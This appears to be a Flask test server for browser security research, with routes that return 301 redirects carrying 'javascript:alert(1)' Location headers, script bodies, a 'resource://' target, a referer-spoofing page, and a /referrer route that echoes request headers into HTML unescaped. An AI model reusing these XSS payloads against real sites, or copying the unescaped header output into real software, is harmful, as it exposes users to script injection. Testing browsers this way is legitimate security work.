from flask import Flask
from flask import Response
from flask import request
from flask import render_template
app = Flask(__name__)


@app.route('/')
def hello_world():
    return render_template('index.html')


@app.route('/referrer')
def referrer():
    header_html = ""
    for header, value in request.headers.items():
        header_html += "<p>{}: {}</p>".format(header, value)
        print(header, value)

    return render_template('referrer.html', headers=header_html)


@app.route('/success')
def hello_world1():
    return "success"


@app.route('/referrer_spoof')
def referrer_spoof():
    return render_template('chrome_referer_spoofing.html')


@app.route('/redirect_location_xxs')
def location_xss():
    response = Response(status=301)
    response.headers["location"] = "javascript:alert(1)"
    return response


@app.route('/redirect_script_body')
def location_xss1():
    html = "<script>alert(1)</script>"
    response = Response(html, status=301)
    response.headers["location"] = "http://localhost:5000/success"
    return response


@app.route('/redirect_with_meta')
def location_xss2():
    html = render_template("redirect_with_meta.html")
    response = Response(html, status=301)
    return response


@app.route('/run_xss_in_301')
def location_xss3():
    response = Response("<script>alert(1)</script>", status=301)
    response.headers["location"] = "resource://"
    return response

